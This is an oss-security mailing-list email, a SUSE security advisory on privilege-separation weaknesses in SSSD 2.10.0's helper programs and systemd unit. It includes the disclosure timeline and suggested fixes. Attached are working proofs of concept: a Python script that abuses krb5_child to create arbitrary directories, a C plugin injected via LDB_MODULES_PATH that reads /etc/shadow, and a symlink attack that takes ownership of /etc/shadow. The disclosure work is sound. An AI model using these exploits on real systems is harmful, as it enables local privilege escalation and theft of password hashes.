Received: (qmail 27789 invoked by uid 550); 19 Dec 2024 15:13:05 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 27750 invoked from network); 19 Dec 2024 15:13:05 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1734621176; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=IkwIBtHHdEhVPo2YXD7qMMLDy9CxHyt8atnodYs2J9k=;
	b=SvHvIZs8mTDE+ZdbYwgrFDlDHLzjmlb2sLyhoYh8LGeD8b/8aAtXZBnKJiNgegUlVXEZPn
	MlotNQ9BIojv53dcchdAB7D5fW7zH7kJolQJkgs0p/J/8PZh/tM9A0psQS1vEo3s+HZCUW
	mxTF53fJVi/bK9N4xB2SriAGuF6AxIM=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1734621176;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=IkwIBtHHdEhVPo2YXD7qMMLDy9CxHyt8atnodYs2J9k=;
	b=T1qIiFj0rPhnALH+Q4WQxjWCOrr+IDLF2S8NV+hMZrjeauVaGdi4k2+9Cd2E6+1aGqySvC
	Ig137HdWLlnKCSCA==
Authentication-Results: smtp-out2.suse.de;
	none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1734621176; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=IkwIBtHHdEhVPo2YXD7qMMLDy9CxHyt8atnodYs2J9k=;
	b=SvHvIZs8mTDE+ZdbYwgrFDlDHLzjmlb2sLyhoYh8LGeD8b/8aAtXZBnKJiNgegUlVXEZPn
	MlotNQ9BIojv53dcchdAB7D5fW7zH7kJolQJkgs0p/J/8PZh/tM9A0psQS1vEo3s+HZCUW
	mxTF53fJVi/bK9N4xB2SriAGuF6AxIM=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1734621176;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=IkwIBtHHdEhVPo2YXD7qMMLDy9CxHyt8atnodYs2J9k=;
	b=T1qIiFj0rPhnALH+Q4WQxjWCOrr+IDLF2S8NV+hMZrjeauVaGdi4k2+9Cd2E6+1aGqySvC
	Ig137HdWLlnKCSCA==
Date: Thu, 19 Dec 2024 16:12:53 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <Z2Q3906x6zCh5hoJ@kasco.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="jhRoTkg09UdkQLVJ"
Content-Disposition: inline
Subject: [oss-security] SSSD: Weaknesses in Privilege Separation due to Issues in Privileged
 Helper Programs

--jhRoTkg09UdkQLVJ
Content-Type: multipart/mixed; protected-headers=v1;
	boundary="5fhHvxt+yCrgA2Fb"
Content-Disposition: inline
Date: Thu, 19 Dec 2024 16:12:53 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Subject: SSSD: Weaknesses in Privilege Separation due to Issues in Privileged
 Helper Programs


--5fhHvxt+yCrgA2Fb
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

this is a report about weaknesses in the privilege separation in SSSD (Syst=
em
Security Services Daemon) [1]. We also offer a rendered version of this rep=
ort
on our blog [2].

1) Introduction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

SSSD  is a suite of daemons dealing with user authentication based on
mechanisms like LDAP, Kerberos and FreeIPA. This report is based on SSSD
release 2.10.0.

SSSD supports setting up user privilege separation by specifying the build
time configure switch `--with-sssd-user=3D...`. The default in many Linux
distributions is still to run SSSD as `root`, though. When privilege
separation is enabled, then file based capabilities are assigned to a couple
of helper binaries shipped by SSSD:

    /usr/libexec/sssd/sssd_pam      root:sssd 0750 cap_dac_read_search=3Dp
    /usr/libexec/sssd/selinux_child root:sssd 0750 cap_chown,cap_dac_overri=
de,cap_setuid,cap_setgid=3Dep
    /usr/libexec/sssd/krb5_child    root:sssd 0750 cap_chown,cap_dac_overri=
de,cap_setuid,cap_setgid=3Dep
    /usr/libexec/sssd/ldap_child    root:sssd 0750 cap_chown,cap_dac_overri=
de,cap_setuid,cap_setgid=3Dep

Only members of the group of the dedicated `sssd` account are allowed to
execute these privileged helpers. In SSSD before version 2.10.0 these helpe=
rs
(with the exception of `sssd_pam`) had setuid-root bits. With commit
7239dd6791 [3] this has been changed to using capabilities instead.

Our openSUSE SSSD packagers enabled privilege separation for the first time=
 in
conjunction with the update to version 2.10.0. This caused the privileged
helpers to pop up on our radar, and we reviewed them. We found that these
helper binaries do not currently provide proper privilege separation in SSS=
D.
Some of them offer attack vectors to escalate to `root` again, or obtain
powerful capabilities. Also the systemd service unit of SSSD has issues when
privilege separation is active. The privileged helpers are not
world-accessible, so no immediate exploitation by local users beyond the
dedicated `sssd` account is possible.

We privately reported the findings described below to the Red Hat Security
team on Nov 15. A coordinated disclosure process was in place for about a
month, until the SSSD developers decided that the issues are *not* security
issues, based on the following reasons:

- the issues are not directly exploitable, but only affect defense-in-depth.
- the `sssd` user and group are powerful by design, since these daemons
  influence the outcome of authentication.
- privilege separation has been introduced as additional hardening, not as a
  strong security layer.
- privilege separation was also introduced for some cosmetic purposes: "to
  allow running SSSD in restricted environment that do not support/allow
  running apps under uid=3D0/in user-ns (like restricted OCP profiles)".

In our opinion, these issues are still security relevant. Consider for exam=
ple
a scenario where a system administrator or packager would allow execution of
the privileged binaries to all users in the system, either by accident or b=
y a
false expectation of security. While it is common practice to deny world
access to privileged binaries, in our experience this is usually done as a
hardening measure only, not to protect against known weaknesses in programs.
While the permissions of the helpers are correctly applied in SSSD's
installation routine, there is no documentation found that these helpers are
security sensitive and must not be accessible to accounts other than `sssd`.

We did not press for CVE assignments, although we believe that formally they
would still be justified. We recognize that it can still be an improvement =
to
run SSSD processes as non-root, even if the privileged helpers allow
escalation back to `root`.

Upstream has nonetheless worked and still works on a range of fixes to addr=
ess
findings from this report. The individual issues we identified are discussed
in the following sections.

2) Issues in `krb5_child` Helper
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D

Like most of the other helpers, this program accepts binary input on STDIN.
The `krb5_child` helper reads the large and complex data structures `struct
krb5_req` and `struct pam_data`. Interesting struct fields in this context
are `krb5_req.ccname` and `krb5_req.keytab`, which specify file paths to
process.

The `ccname` field is used in the code path `privileged_krb5_setup()` =E2=
=86=92
`k5c_ccache_setup()` =E2=86=92 `k5c_precreate_ccache()`.  This ends up in a
loop [4] that creates all the parent directories of the path
specified via STDIN, using `uid` and `gid` values also received from STDIN.

The attached proof-of-concept sssd-create-dir-via-krb5.py shows how to crea=
te
arbitrary new directories with arbitrary ownership this way. This very like=
ly
allows a full local root exploit by skillfully creating directories under
attacker control, e.g.  directories used during lookup for trusted system
binaries or libraries, or directories in `/etc` that are used for trusted
configuration files or privileged services.

Upstream Fix
------------

This specific escalation path has been addressed in the SSSD 2.10.1 bugfix
release [5]. Given the extensive interface offered by this helper program it
is likely that further such escalation vectors exist. Since upstream does n=
ot
consider this a strong security barrier, we have not looked any deeper into
this component.

3) Issues in `sssd_pam` Helper
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D

This helper starts a server instance which offers a socket-based IPC interf=
ace
for passing PAM operation requests to it. This is the only helper that has
more limited capabilities, namely only `CAP_DAC_READ_SEARCH`, which allows =
to
override any read-access permission checks.

In the code path `server_setup()` =E2=86=92 `confdb_init()` the following e=
nvironment
variables are interpreted in `ldb_init()` [6] (which is part of Samba libra=
ry
code):

- `LDB_MODULES_PATH`
- `LDB_MODULES_ENABLE_DEEPBIND`
- `TDB_NO_FSYNC`

The `LDB_MODULES_PATH` variable allows the caller to specify a directory fr=
om
which arbitrary shared objects are loaded via `dlopen()`. The attached
simple proof-of-concept sssd-pam-read-search-plugin.c shows how to exploit
this situation to gain access to the contents of `/etc/shadow`.

Contrary to the other helper programs, `sssd_pam` was not assigned setuid-r=
oot
bits previously. The `CAP_DAC_READ_SEARCH` has only more recently been added
via commit 0562646cc261 [7], to allow it to access keytabs without having to
run as `root`.

Upstream Fix
------------

There is a pending upstream pull request [8] to clear the environment of th=
is
helper to prevent this specific privilege escalation path.

4) Notes on the `selinux_child` Helper
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We haven't found any specific privilege escalation paths in this helper. The
nature of this helper is to allow modification of SELinux MLS mappings,
though. It accepts the new MLS range for arbitrary usernames via a binary
protocol on STDIN. In an SELinux MLS managed system this is a pretty strong
privilege for SSSD to have. Since this is likely by design, we suppose ther=
e is
little that can be done about that, except for documenting the sensitive
nature of the helper and that access to it must be well restricted.

The helper performs calls into shared SSSD library code and into libsemanage
and libselinux. Luckily we couldn't find any cases where overly problematic
environment variables are interpreted (beyond the common variables listed in
section 7.a).

This helper also changes its UID and GID to 0 early on [9]. When transition=
ing
to UID 0, the kernel does not assign the full set of capabilities to the
process again. This means that the process runs under ***restricted*** root
privileges, having UID and GID 0 but only the capabilities assigned to the
`selinux_child` binary. Additionally, the SSSD processes run with the syste=
md
hardening feature `SecureBits=3Dnoroot noroot-locked`, thus preventing the
helper from using setuid binaries like `sudo` to regain full root privilege=
s.

The security of restricted root privileges in Linux is lacking, though. The
Linux kernel uses capabilities for its permission checks, but userspace
utilities normally only rely on other process's UID and GID credentials. Al=
so
some APIs lack the possibility to express restricted root privileges,
e.g. in UNIX domain sockets the `SO_PEERCRED` option is used to determine t=
he
credentials of a peer process, which only provides a `struct ucred`,
containing the peer process's PID, UID and GID. Thus this helper runs with
privileges close to full `root`.

5) Notes on the `ldap_child` Helper
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We couldn't find any bigger problems in this helper, beyond the generic
comments in section 7) that also apply to this helper.

6) Issues in the `sssd.service` Unit
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The `sssd.service` systemd unit contains the following `ExecStartPre` lines:

    ExecStartPre=3D+-/bin/chown -f -R root:@SSSD_USER@ @sssdconfdir@
    ExecStartPre=3D+-/bin/chmod -f -R g+r @sssdconfdir@
    ExecStartPre=3D+-/bin/sh -c "/bin/chown -f @SSSD_USER@:@SSSD_USER@ @dbp=
ath@/*.ldb"
    ExecStartPre=3D+-/bin/chown -f -R @SSSD_USER@:@SSSD_USER@ @gpocachepath@
    ExecStartPre=3D+-/bin/sh -c "/bin/chown -f @SSSD_USER@:@SSSD_USER@ @log=
path@/*.log"

The directories `/var/log/sssd` and `/var/lib/sssd` are owned by the
unprivileged `sssd` user. The `chown` and `chmod` lines above, which are run
as `root`, allow a compromised `sssd` user to stage symlink attacks and thus
gain ownership of, or access to, privileged system files.

This is a simple proof-of-concept demonstrating the issue:

    # stage a symlink attack to gain ownership of /etc/shadow
    sssd$ cd /var/log/sssd
    sssd$ ln -s /etc/shadow my.log
    # as root trigger a sssd (re)start
    # sssd needs to be configured (i.e. /etc/sssd & friends need to exist) =
for this to work
    root# systemctl restart sssd.service
    root# ls -lh /etc/shadow
    -rw------- 1 sssd sssd 889 Nov 13 11:40 /etc/shadow

As the directories that are affected by this are not world-writable and don=
't
carry a sticky bit, the Linux kernel's symlink protection does not come to =
the
rescue here. Path arguments that are named directly on the command line of
`chown` or `chmod` will be followed, if they're symlinks, unless
`--no-dereference` is passed. Passing this option is also the recommended f=
ix
for this.

In our opinion such automatic permission "fixes" should be treated with car=
e.
If this is to avoid any trouble with migration from older installations
(without privilege separation) then we would rather offer an explicit utili=
ty
for system administrators to run. This would make clear that the logic only
runs once and not every time `sssd` is started. It also would prevent any
configuration errors from persisting or from being masked (e.g. other
components in the system that assign bad permissions to SSSD files, thus
fighting against the automatic permission fixes).

Upstream Fix
------------

There is a pending upstream pull request [8] to pass `--no-dreference` to t=
he
`chown` invocations found in the systemd service unit.

7) Further Observations
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

7.a) Environment Variables
-------------------------

There are further environment variables interpreted by the helper programs:

- `TALLOC_FREE_FILL`: will cause memory `free()`'d via `talloc_free()` to be
  overwritten with the byte set in this variable.
- `_SSS_DOM`: will influence systemd journal log messages and thus allow a =
bit
  of log spoofing.

While these variables have only minor influence on program execution,
privileged programs should not allow arbitrary environment settings to affe=
ct
their behaviour.

7.b) Dumpable Process Attribute Setting
--------------------------------------

All of the privileged helpers support a `--dumpable` command line switch to
control whether the process will have the dumpable bit set or not. The defa=
ult
for this even *is* to mark the process as dumpable (`SUID_DUMP_USER`). This
somewhat unexpectedly overrides the sysctl setting `fs.suid_dumpable`, which
is usually 0 or 2.

The dumpable setting of a process is a sensitive property that plays an
important role in the `ptrace()` system call to determine whether tracing
another process is allowed. From `man 2 ptrace`:

> These checks are performed in cases where one process can inspect sensiti=
ve
> information about, or in some cases modify the state of, another process.
> The checks are based on factors such as the credentials and capabilities =
of
> the two processes, whether or not the "target" process is dumpable [...]

We believe the only barrier left that prevents the unprivileged `sssd` user
from being allowed to trace the privileged binaries is this (further excerpt
from `man 2 ptrace`):

> (5.2)  Deny access if neither of the following is true:
>        - The caller and the target process are in the same user
>          namespace, and the caller=E2=80=99s capabilities are a superset =
of the target
>          process=E2=80=99s permitted capabilities.

Attaching via `ptrace()` is only denied because the target processes have
raised capabilities. However, this is only a kind of kernel security
extension, provided by the kernel security module
`security_ptrace_access_check()`.

Besides this, the dumpable setting allows the unprivileged user to send
e.g. a SIGSEGV signal to the privileged processes and force them to dump co=
re.
What happens from here depends on the core dump handler installed in the
system. `systemd-coredump` safely handles such core dumps and the unprivile=
ged
user cannot access them. If only `core` is configured as a core pattern, li=
ke
it is the case on Debian Linux by default, for example, then the unprivileg=
ed
user can cause the `core` file to be created in arbitrary directories, by
first changing into them, starting the privileged process, then killing
it. The `core` file will not be readable for the unprivileged user, but it
still allows to clutter the file system and maybe even overwrite legit files
that are named `core`.

7.c) Debugging Settings
-----------------------

The privileged programs also offer rich command line settings for enabling
debugging output and redirecting it to various locations. Generally, privil=
eged
programs should be very careful about what kind of information is leaked to
the caller. The debugging logs can contain information that weakens security
features (like stack overflow protection) or leak privileged information th=
at
has been read in from privileged files.

8) Suggested Fixes
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

For privileged setuid-root-like binaries the usual precautions should be
taken:

- change into a safe current working directory (CWD).
- apply a safe umask (this already happens)
- cleanse the environment from any untrusted variables, only keep a whiteli=
st
  of vetted variables. E.g. also set a safe PATH.
- make sure none of the interfaces (command line parameters, STDIN data inp=
ut)
  offers possibilities for the unprivileged caller to escalate their
  privileges beyond the scope of what the privileged program is supposed to
  do.

The last item will likely be the most difficult to realize for the programs=
 in
question - especially in the `krb5_child` helper we expect more attack surf=
ace
to exist, for example in the handling of the `ccache` and `keytab` files.
These are dealt with in various other code paths via krb5 library routines
that are unaware of the untrusted input. We suggested upstream to carefully
think through all the possible inputs and code paths and to tighten them.

We would furthermore strip down the supported command line switches, or lim=
it
critical switches to callers that are `root`, notably the switches that
influence debugging and logging as mentioned in section 7.c.

The `dumpable` setting should be left unchanged in the privilege escalation
context.

Finally we suggest to clearly document what can be expected of the privilege
separation feature and how the privileged helpers need to be packaged in or=
der
to achieve a safe installation (especially that they must not be world
executable). This already happened in the description of the 2.10.1 bugfix
release [5].

9) Situation on Other Distributions
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We looked into a number of other Linux distributions and found that on Fedo=
ra,
Debian and Ubuntu the SSSD privilege separation is not currently used. On A=
rch
Linux the current 2.10.0 version is used together with privilege separation,
though, which is affected by the issues covered in this report. Upstream
informed us that there are plans for Fedora Linux to use the privilege
separation feature soon as well.

10) Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2024-11-15: We reported the issues to the Red Hat Security Team via secaler=
t@redhat.com
2024-12-04: Red Hat Security assigned 3 CVEs for items 2), 3) and 6) (all
            later retracted). A coordinated release date (CRD) of 2024-12-1=
8 has been
            suggested and agreed upon.
2024-12-04: SSSD developer Alexey Tikhonov responded to the report explaini=
ng
            that he doesn't consider these findings CVE-worthy.
2024-12-09: Red Hat Security suggested to keep the 3 CVEs but to consider t=
he
            issues very high complexity to exploit.
2024-12-10: After internal discussions Red Hat security decided to retract =
the
            CVEs, not considering these findings to be flaws.
2024-12-10: Upstream published a bugfix release 2.10.1 [5] containing a fix
	    for issue 2) and a note hinting at the sensitivity of the helper's
            permissions used in packaging.
2024-12-13: After some unclarity about whether the coordinated disclosure
            process should be continued, we agreed upon immediate publicati=
on.
2024-12-13: Upstream created a pull request [8] containing further fixes
            addressing issues 3) and 6).

11) References
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[1]: https://github.com/SSSD/sssd.git
[2]: https://security.opensuse.org/2024/12/19/sssd-lacking-privilege-separa=
tion.html
[3]: https://github.com/SSSD/sssd/commit/7239dd679106748cabfd914df0344601ec=
5ce224
[4]: https://github.com/SSSD/sssd/blob/2.10.0/src/providers/krb5/krb5_ccach=
e.c#L247
[5]: https://github.com/SSSD/sssd/releases/tag/2.10.1
[6]: https://github.com/samba-team/samba/blob/master/lib/ldb/common/ldb.c#L=
94
[7]: https://github.com/SSSD/sssd/commit/0562646cc261
[8]: https://github.com/SSSD/sssd/pull/7764
[9]: https://github.com/SSSD/sssd/blob/2.10.0/src/providers/ipa/selinux_chi=
ld.c#L300

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=C3=BCrnberg
Gesch=C3=A4ftsf=C3=BChrer: Ivo Totev, Andrew McDonald, Werner Knoblich

--5fhHvxt+yCrgA2Fb
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="sssd-create-dir-via-krb5.py"

#!/usr/bin/python3

# Author: Matthias Gerstner (SUSE Linux)
# 2024-11-14
#
# This is a proof-of-concept to show that the krb5_child helper program from
# SSSD version 2.0.10 allows to create arbitrary new directories with
# arbitrary membership.
#
# To test this you need to adjust the HELPER path below to the proper location
# and invoke the script as the unprivileged SSSD user like this:
#
# sssd-create-dir-via-krb5.py `id -u`:`id -g` /path/to/new/directory

import argparse
import os
import struct
import subprocess
import sys

HELPER="/usr/libexec/sssd/krb5_child"

parser = argparse.ArgumentParser()
parser.add_argument("ownership", metavar="OWNERSHIP", help="uid:gid ownership to give to file")
parser.add_argument("path", metavar="DIRPATH", help="path to apply new ownership to")

args = parser.parse_args()

try:
    uid, gid = args.ownership.split(':')
    uid = int(uid)
    gid = int(gid)
except Exception:
    print("Failed to parse OWNERSHIP from", args.ownership, "expected format '<uid>:<gid>'", file=sys.stderr)
    sys.exit(1)

if os.path.exists(args.path):
    print(args.path, "already exists. This PoC can only create new directories.")
    sys.exit(1)

proc = subprocess.Popen([HELPER, "--debug-fd=2", "--debug-level=10", "--logger=stderr"], stdin=subprocess.PIPE)

def bin_uint32(i):
    return struct.pack("=I", i)

def bin_str(s):
    return bin_uint32(len(s)) + s.encode()

data = bytes()
data += bin_uint32(0x00F1) # pd->cmd SSS_PAM_AUTHENTICATE
data += bin_uint32(uid) # kr->uid
data += bin_uint32(gid) # kr->gid
data += bin_uint32(0) # kr->validate
data += bin_uint32(0) # kr->posix_domain
data += bin_uint32(0) # offline
data += bin_uint32(0) # send_pac
data += bin_uint32(0) # use_enterprise_princ
data += bin_str("test") # kr->upn
data += bin_str(args.path + "/base") # kr->ccname
data += bin_str("") # kr->old_ccname
data += bin_str("") # kr->keytab
data += bin_uint32(0) # auth_token_type (0 == TYPE_EMPTY)
data += bin_str("") # auth_token

data = bin_uint32(len(data)) + data

proc.stdin.write(data)
proc.stdin.close()

res = proc.wait()
print("helper exited with", res)

if not os.path.isdir(args.path):
    print("The PoC seems to have failed to create the new directory.")
else:
    print("The new directory has been created:")
    subprocess.call(["ls", "-ld", args.path])


--5fhHvxt+yCrgA2Fb
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="sssd-pam-read-search-plugin.c"

/*
 * Author: Matthias Gerstner (SUSE Linux)
 * Date: 2024-11-14
 *
 * This is a proof-of-concept to show that the sssd_pam helper program from
 * SSSD version 2.0.10 allows to gain full control over the CAP_DAC_READ_SEARCH
 * capability.
 *
 * To test this you need to follow these instructions as the unprivileged
 * `sssd` user.
 *
 * $ mkdir plugins
 * $ cd plugins
 * $ gcc sssd-pam-read-search-plugin.c -fPIC -shared -oread-search-plugin.so
 * $ export LDB_MODULES_PATH=$PWD
 * # execute the privileged PAM helper, the code injection should trigger
 * $ /path/to/sssd_pam
 */

#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <malloc.h>
#include <sys/capability.h>

static void print_caps() {
	FILE *file = fopen("/proc/self/status", "r");

	if (!file) {
		printf("Failed to open /proc/self/status\n");
		return;
	}

	char *line = NULL;
	size_t len = 0;

	while (true) {
		ssize_t res = getline(&line, &len, file);
		if (res < 0) {
			break;
		}

		if (res > 3 && strncmp(line, "Cap", 3) == 0) {
			printf("\t%s", line);
		}
	}

	free(line);
	fclose(file);
}

static void print_shadow() {
	FILE *file = fopen("/etc/shadow", "r");

	if (!file) {
		printf("Failed to open /etc/shadow\n");
		return;
	}

	char *line = NULL;
	size_t len = 0;

	while (true) {
		ssize_t res = getline(&line, &len, file);
		if (res < 0) {
			break;
		}

		printf("> %s", line);
	}

	free(line);
	fclose(file);
}

static void set_effective_caps() {
	cap_t handle = cap_init();

	if (!handle)
		return;

	cap_value_t caps[1];
	caps[0] = CAP_DAC_READ_SEARCH;
	if (cap_set_flag(handle, CAP_EFFECTIVE, 1, caps, CAP_SET) != 0) {
		printf("Failed to set effective bit CAP_DAC_READ_SEARCH\n");
	}
	if (cap_set_flag(handle, CAP_PERMITTED, 1, caps, CAP_SET) != 0) {
		printf("Failed to set permitted bit CAP_DAC_READ_SEARCH\n");
	}

	if (cap_set_proc(handle) != 0) {
		printf("Failed to cap_set_proc()\n");
	}

	cap_free(handle);
}

void __attribute__ ((constructor)) init(void) {
	printf("Injected code is running\n");

	printf("\nCurrent capabilities:\n\n");
	print_caps();

	printf("\nSetting effective caps\n");
	set_effective_caps();
	printf("\nNew capabilities\n\n");
	print_caps();

	printf("\nLet's check /etc/shadow:\n\n");
	print_shadow();
}

--5fhHvxt+yCrgA2Fb--

--jhRoTkg09UdkQLVJ
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmdkN/YACgkQFMQFyXGS
NVOnRRAAz/IDt3E0Rj+vRI4QJ5LAF6DTqMCfsXd8JCBzqIoOqnV8qMD6JEFwPu4g
Qkdri5MT9Oxt3s9CEva4E55L/2geQQCClUwQO6NWvd5ACrWoiuk/PgimgDiH77RP
l7AbehphlA6Eb5Rhz4CqSrcC0VhgVS7wlMzd6WBigwDrzCrHn5w2aJ2FWK7FWGGl
A8oNmidg08L2rlJEmtpHp1JDUmgZq4UqF/blYqpom7Sq1l5TcBm4raWMjfU8XkXo
oiXNjXpOjL/cYWAxd2N820zm08CKJjtmYpIqHcoK8Bg/th+OPfs+iyRxGpAcPjRW
Qc8I+LsZst2IjefFLgvYkyTh0YGuO4E4YbU9yRH27y0FGIvLRYJReYAzqgUgV72a
sa1jNgYQjG2ryTnZDDbDb61K6crhnDLXmZ16nfTmgRP92tY0Hvi/XBNYlXDeMFXT
AIf5xFd7V7O33IQsXQP8xaoMAunSNQpG/s246kV4E6owfzkWCPhfY00LOerBzPEG
EFH/BZno4FqLhdZdsyhn9fMGGTbwXzyResTZxazgccYN/zxj72rMLOhu1fp07n0o
u8il7Zf/rUfxel/OiUsUJt/Lt1iVwEk6z576qUZSJ5LtuN44Iu6pQ3BqO58rDSpY
SmQyJP3W4bVzOeODJutDAyGzHhtoO1cbhXzw45VKheDvaPmCEcY=
=5JH5
-----END PGP SIGNATURE-----

--jhRoTkg09UdkQLVJ--
